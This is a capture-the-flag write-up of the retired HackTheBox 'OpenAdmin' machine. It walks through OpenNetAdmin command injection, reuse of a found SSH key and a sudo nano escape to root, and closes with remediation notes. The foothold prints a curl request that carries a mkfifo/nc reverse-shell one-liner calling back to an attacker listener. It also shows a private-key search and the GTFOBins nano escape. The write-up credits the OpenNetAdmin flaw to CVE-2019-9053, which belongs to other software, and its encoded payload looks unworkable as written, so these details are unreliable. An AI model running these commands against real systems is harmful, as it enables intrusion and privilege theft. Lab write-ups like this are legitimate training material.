HTB OpenAdmin: OpenNetAdmin RCE, key reuse, and sudo nano

retired-machineeasy

OpenAdmin is a retired HackTheBox easy Linux machine rewarding reading every page the site offers. Synopsis: OpenNetAdmin 18.1.1 command injection (CVE-2019-9053) to www-data, an SSH key that works twice, and a GTFOBins nano escape to root.

$ Enumeration — version the inventory app

# nmap: spot OpenNetAdmin 18.1.1
nmap -sC -sV -oN openadmin.nmap 10.10.10.171

Apache with OpenNetAdmin 18.1.1 — a network inventory tool whose version maps to CVE-2019-9053, a practically-unauthenticated command injection. Version plus CVE equals the plan.

$ Foothold — ONA RCE

# bash: ONA injection to callback
# CVE-2019-9053: crafted ONA endpoint request executes shell commands
curl -s "http://10.10.10.171/ona/login.php" --data "xajax=window_submit&xajaxr=...&payload=$(echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f" | base64)"
nc -lvnp 4444   # www-data

Confirm code execution with a sleep/id callback before upgrading the shell. The endpoint passes input to shell commands — public exploit or manual curl, either way.

$ Lateral move — key reuse

# bash: find the key, try it everywhere
find /var/www -name "*.key" -o -name "id_rsa*" 2>/dev/null
ssh -i found_key jimmy@10.10.10.171

Enumeration finds an SSH private key readable in the web tree — and the same key authenticates a second user over SSH. Keys without passphrases that work in multiple places: one key, two identities.

$ Privilege escalation — sudo nano

# bash: nano escape via GTFOBins
sudo -l   # (root) NOPASSWD: /bin/nano /opt/priv
sudo /bin/nano /opt/priv
# inside nano: ^R ^X, then: reset; sh 1>&0 2>&0
id   # uid=0(root)

Sudo on any editor is root; the allowed-file restriction does not survive the escape. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Assuming the ONA login blocks the CVE (test the injection path directly) and treating the found key as single-use (try recovered keys against every user and service).

$ Remediation notes

Patch ONA past 18.1.1, keep private keys out of web trees with unique passphrases, and audit sudo against GTFOBins. Written by Lucky Thandel.
